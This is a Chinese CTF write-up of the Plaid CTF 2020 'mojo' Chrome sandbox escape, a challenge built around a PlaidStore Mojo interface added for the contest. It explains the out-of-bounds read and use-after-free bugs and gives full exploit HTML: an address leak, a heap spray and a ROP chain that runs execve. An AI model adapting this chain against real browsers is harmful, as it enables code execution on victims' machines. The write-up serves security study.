---
layout: post

title: 'Plaid-CTF-2020-mojo-chrome沙箱逃逸分析'

date: '2020-09-14'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'


---

<!-- more -->

## 前言

### vector

向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。跟任意其它类型容器一样，它能够存放各种类型的对象。可以简单的认为，向量是一个能够存放任意类型的动态数组。 

### 环境搭建

题目文件下载地址：

[https://github.com/De4dCr0w/Browser-pwn/tree/master/Vulnerability%20analyze/Plaid-CTF-2020-mojo-chrome%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90](https://github.com/De4dCr0w/Browser-pwn/tree/master/Vulnerability analyze/Plaid-CTF-2020-mojo-chrome沙箱逃逸分析)

（1）安装docker：

```
sudo snap install docker
```

（2）运行run.sh

```c
#!/bin/bash

export PORT=8080
export WWW="$(pwd)/www"
export UNAME=$(uname)

mkdir $WWW || true

docker build -t mojo .
unzip -o mojo_js.zip -d $WWW

# npm install -g node-static
(cd $WWW && static -a 0.0.0.0 -p $PORT) &

if [ "$UNAME" == "Linux" ]; then
  export HOST_IP=$(ip route | grep docker0 | awk '{print $9}')
fi

# apt install socat
socat tcp-listen:1337,fork,reuseaddr,bind=0.0.0.0 exec:"python3 -u ./server.py"
```

（3）将exp.html 放入 www目录中

（4）运行chrome

```
./chrome --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS,MojoJSTest 
```

（5）访问127.0.0.1:8080/exp.html 

（6）调试相关

查找调试符号：

```
nm --demangle  ./chrome |grep -i 'PlaidStoreImpl::Create'
```

## 漏洞分析

题目添加了两个操作StoreData和GetData：

```c
+++ b/third_party/blink/public/mojom/plaidstore/plaidstore.mojom
@@ -0,0 +1,11 @@
+module blink.mojom;
+
+// This interface provides a data store
+interface PlaidStore {
+
+  // Stores data in the data store
+  StoreData(string key, array<uint8> data);
+
+  // Gets data from the data store
+  GetData(string key, uint32 count) => (array<uint8> data);
+};
```

StoreData操作将传进data，对应相应的key存放在data_store_ vector容器中：

```c++
void PlaidStoreImpl::StoreData(
    const std::string &key,
    const std::vector<uint8_t> &data) {
  if (!render_frame_host_->IsRenderFrameLive()) {
    return;
  }
  data_store_[key] = data;
}
```

之后可以利用GetData操作，通过相应的key查找data，但返回时对count缺少检验，如p.getData("aaaa",0x200))会返回key 为"aaaa"的data对象 [0,0x200)的数据，如果data对象为Uint8Array(0x100))，就会造成越界读：

```c++
void PlaidStoreImpl::GetData(
	    const std::string &key,
	    uint32_t count,
	    GetDataCallback callback) {
	  if (!render_frame_host_->IsRenderFrameLive()) {
	    std::move(callback).Run({});
	    return;
	  }
	  auto it = data_store_.find(key);
	  if (it == data_store_.end()) {
	    std::move(callback).Run({});
	    return;
	  }
	  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
	  std::move(callback).Run(result);
	}
```

另一个漏洞是UAF漏洞：

```c
if (!render_frame_host_->IsRenderFrameLive()) {
	    std::move(callback).Run({});
	    return;
	  }
```

未检查render_frame_host_ 是否可用，在删除iframe（frame.remove();）后会释放render_frame_host_，之后可以通过堆喷render_frame_host_结构体大小的堆块重新申请到，改写其函数指针，之后执行render_frame_host_->IsRenderFrameLive() ，就能控制rip。

## 漏洞利用

调用漏洞代码:

```javascript
<script src="mojo/public/js/mojo_bindings_lite.js"></script>
<script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
<script>
	let p = blink.mojom.PlaidStore.getRemote(true);
	await p.storeData("yeet",new Uint8Array(0x28).fill(0x41));
	// await p.getData("yeet", count).data;
</script>
```

#### （1）泄露chrome加载的基地址

在gdb中对content::PlaidStoreImpl::Create 下断点，找到其地址，之后用x/i 查看汇编代码：

![image-20200914170028800](..\image\2020-09-14-Plaid-CTF-2020-mojo-chrome沙箱逃逸分析\1.png)

可以看到PlaidStore 对象的大小为0x28，地址保存在rax中，rcx为vtable地址，保存在0偏移处。rbx为render_frame_host_地址，保存在+0x8偏移处。所以我们通过`p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));`申请0x28字节大小的数组，并且和PlaidStore 一起申请，使它们在内存中相邻，之后就可以通过p.GetData泄露vtable 和 render_frame_host _地址。泄露出来的vtable地址减去偏移就可以得到chrome加载的基地址。 

#### （2）伪造 render_frame_host_ 结构，即rop链

在content::RenderFrameHostFactory::Create 下断点，获得地址之后查看相关代码，可以找到RenderFrameHost 对象的大小为0xc28，之后堆喷0xc28 大小的 ArrayBuffer，重新获得被释放的对象。

![image-20200915150352902](..\image\2020-09-14-Plaid-CTF-2020-mojo-chrome沙箱逃逸分析\3.png)

render_frame_host_->IsRenderFrameLive() 调用的反汇编代码如下：

```c
0x00005555591ac2c7 <+23>:    mov    r14,rsi              
0x00005555591ac2ca <+26>:    mov    rbx,rdi                        
0x00005555591ac2cd <+29>:    mov    rdi,QWORD PTR [rdi+0x8]// rdi == render_frame_host_   
0x00005555591ac2d1 <+33>:    mov    rax,QWORD PTR [rdi] // rax ==> vtable 
0x00005555591ac2d4 <+36>:    call   QWORD PTR [rax+0x160]  // vtable+0x160 ==> IsRenderFrameLive
```

利用堆喷获得原render_frame_host_ 结构的堆块，并填充为伪造的 render_frame_host_ 结构，构造的内容如下：

```c
frame_addr =>   [0x00] : vtable  ==> frame_addr + 0x10  ----
				[0x08] : 0x0                               | 
new rsp	==>		[0x10] : 0xdeadbeef  ==> rbp <-------------|    
                [0x18] : gadget => pop rdi; ret;           
            /-- [0x20] : frame_addr + 0x180 
            |   [0x28] : gadget => pop rax; ret;                    
            |   [0x30] : gadget => SYS_execve                      
            |   [0x38] : gadget => xor rsi, rsi; pop rbp; jmp rax   
            |   [0x40] : 0xdeadbeef
            |   ...                                                 
            |   [0x160 + 0x10] : xchg rax, rsp; clc; pop rbp; ret;    <= isRenderFrameLive
            |   [0x160 + 0x18] : 
            -> 	[0x180 ... ] : "/home/chrome/flag_printer"
```

因为rax存的是vtable的地址值，此时被填充为 `frame_addr+0x10`，所以 `call   QWORD PTR [rax+0x160]`时会调用`frame_addr+0x10+0x160` 保存的地址，即rop链的入口：`xchg rax, rsp; clc; pop rbp; ret;` 进行栈迁移，此时rsp填充为`frame_addr + 0x10` , 然后 `pop rbp`, 将0xdeadbeef pop 进 rbp。ret 后 rsp指向 [0x18] 执行gadget ：`pop rdi`, 将执行参数地址给rdi，`pop rax` 将execve@plt 给rax，最后跳转到rax，执行：

```c
execve("/home/chrome/flag_printer",rsi,env);
```

#### （3） 构造UAF，触发执行

a、首先创建一个iframe：

```javascript
var allocateFrame = () =>{
			var frame = document.createElement("iframe");
			frame.src = "/iframe.html"
			document.body.appendChild(frame);
			return frame;
		}
```

和之前泄露chrome 基地址类似，泄露iframe的 render_frame_host_ 地址，这部分的代码在iframe.html 中：

```html
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <script src="mojo/public/js/mojo_bindings_lite.js"></script>
        <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
	<script>
	async function leak() {
		//Same code with the one in pwn.js
		console.log("Starting frame leak");
		var stores = [];
		let p = blink.mojom.PlaidStore.getRemote(true);
		for(let i = 0;i< 0x40; i++ ){
			await p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));
			stores[i] = blink.mojom.PlaidStore.getRemote(true);
		}
		let chromeBase = 0;
		let renderFrameHost = 0;
		for(let i = 0;i<0x40&&chromeBase==0;i++){
			let d = (await p.getData("yeet"+i,0x200)).data;
			let u8 = new Uint8Array(d)
			let u64 = new BigInt64Array(u8.buffer);
			for(let j = 5;j<u64.length;j++){
				let l = u64[j]&BigInt(0xf00000000000)
				let h = u64[j]&BigInt(0x000000000fff)
				if((l==BigInt(0x500000000000))&&h==BigInt(0x7a0)){
					chromeBase = u64[j]-BigInt(0x9fb67a0);
					renderFrameHost = u64[j+1];
					break;
				}
			}
		}
		window.chromeBase = chromeBase;
		window.renderFrameHost = renderFrameHost;
		window.p = p;
		return chromeBase!=0&&renderFrameHost!=0;
	}
	</script>
    </body>
</html>
```

泄露出的render_frame_host_ 地址用于填充rop 链，即frame_addr。

b、释放iframe

```html
frame.remove();
```

c、进行堆喷，重新获得释放的对象

```javascript
for(let i = 0;i< 0x400;i++){    // 堆喷重新获得之前释放的render_frame_host_堆块
	await p.storeData("bruh"+i,frameData8);
}
```

d、触发漏洞

```javascript
await frameStore.getData("yeet0",0); // 触发render_frame_host_->IsRenderFrameLive()
```



exp 代码：

```html
<!DOCTYPE html>
<html>
    <head>
        <style>
            body {
              font-family: monospace;
            }
        </style>
    </head>
    <body>
        <script src="mojo/public/js/mojo_bindings_lite.js"></script>
        <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
	<script> 
	async function a() {
        // 泄露chrome基地址
		var stores = [];
		let p = blink.mojom.PlaidStore.getRemote(true);
		for(let i = 0;i< 0x40; i++ ){
			await p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));
			stores[i] = blink.mojom.PlaidStore.getRemote(true);
		}
		let chromeBase = 0;
		let renderFrameHost = 0;
		for(let i = 0;i<0x40&&chromeBase==0;i++){
			let d = (await p.getData("yeet"+i,0x200)).data;
			let u8 = new Uint8Array(d)
			let u64 = new BigInt64Array(u8.buffer);
			for(let j = 5;j<u64.length;j++){
				let l = u64[j]&BigInt(0xf00000000000)
				let h = u64[j]&BigInt(0x000000000fff)
				if((l==BigInt(0x500000000000))&&h==BigInt(0x7a0)){
					//console.log('0x'+u64[j].toString(16));
					document.write('0x'+u64[j].toString(16)+'<br/>');
					chromeBase = u64[j]-BigInt(0x9fb67a0);
					renderFrameHost = u64[j+1];
					break;
				}
			}
		}
		document.write("ChromeBase: 0x"+chromeBase.toString(16) + '<br/>');
		document.write("renderFrameHost: 0x"+renderFrameHost.toString(16) + '<br/>');
        
        // 伪造 render_frame_host_ 结构
		const kRenderFrameHostSize = 0xc28; 
		var frameData = new ArrayBuffer(kRenderFrameHostSize);
		var frameData8 = new Uint8Array(frameData).fill(0x0);
		var frameDataView = new DataView(frameData)
		var ropChainView = new BigInt64Array(frameData,0x10); // 从frameData+0x10 处开始给ropChainView
		frameDataView.setBigInt64(0x160+0x10,chromeBase + 0x880dee8n,true); //xchg rax, rsp
		frameDataView.setBigInt64(0x180, 0x2f686f6d652f6368n,false);
		frameDataView.setBigInt64(0x188, 0x726f6d652f666c61n,false);
		frameDataView.setBigInt64(0x190, 0x675f7072696e7465n,false);// /home/chrome/flag_printer\0; big-endian
		frameDataView.setBigInt64(0x198, 0x7200000000000000n,false);// /home/chrome/flag_printer\0; big-endian
		ropChainView[0] = 0xdeadbeef3n; // RIP rbp :<
		ropChainView[1] = chromeBase + 0x2e4630fn; //pop rdi;
		ropChainView[2] = 0x4141414141414141n; // frameaddr+0x180
		ropChainView[3] = chromeBase + 0x2e651ddn; // pop rax;
		ropChainView[4] = chromeBase + 0x9efca30n; // execve@plt
		ropChainView[5] = chromeBase + 0x8d08a16n; // xor rsi, rsi; pop rbp; jmp rax
		ropChainView[6] = 0xdeadbeefn; // rbp
		//Constrait: rdx = 0; rdi pointed to ./flag_reader\0
		var allocateFrame = () =>{
			var frame = document.createElement("iframe");
			frame.src = "/iframe.html"
			document.body.appendChild(frame);
			return frame;
		}
		var frame = allocateFrame();
		frame.contentWindow.addEventListener("DOMContentLoaded",async ()=>{
			if(!(await frame.contentWindow.leak())){
				console.log("frame leak failed!");
				return
			}
			if(frame.contentWindow.chromeBase!=chromeBase){
				console.log("different chrome base!! wtf!")
				return
			}
			var frameAddr = frame.contentWindow.renderFrameHost;
			//console.log("frame addr:0x"+frameAddr.toString(16));
			frameDataView.setBigInt64(0,frameAddr+0x10n,true); //vtable/ rax
            ropChainView[2] = frameAddr + 0x180n;
			//stashing the pointer of iframe.
			var frameStore = frame.contentWindow.p;
			//freeeee
			frame.remove();  // 释放render_frame_host_
			frame = 0;
			var arr = [];
			//Reallocate of RenderFrameHost with our controlled data.
			for(let i = 0;i< 0x400;i++){    // 堆喷重新获得之前释放的render_frame_host_堆块
				await p.storeData("bruh"+i,frameData8);
			}
			//go go
			await frameStore.getData("yeet0",0); // 触发render_frame_host_->IsRenderFrameLive()
			});
		}
        
	document.addEventListener("DOMContentLoaded",()=>{a();});
	</script>
    </body>
</html>
```

运行效果示意图：

![image-20200915141615676](..\image\2020-09-14-Plaid-CTF-2020-mojo-chrome沙箱逃逸分析\2.png)



所以目前总结chrome 逃逸一般需要两个漏洞进行：

（1）信息泄露，泄露出chrome 加载的基地址

（2）可以进行代码执行的漏洞，比如越界读写，UAF之类的漏洞，修改某个结构的函数指针，进行代码执行。



## 参考链接

https://www.anquanke.com/post/id/209800#h3-6

https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/

https://pwnfirstsear.ch/2020/04/20/plaidctf2020-mojo.html

https://play.plaidctf.com/files/mojo-837fd2df59f60214ffa666a0b71238b260ffd9114fd612a7f633f4ba1b4da74f.tar.gz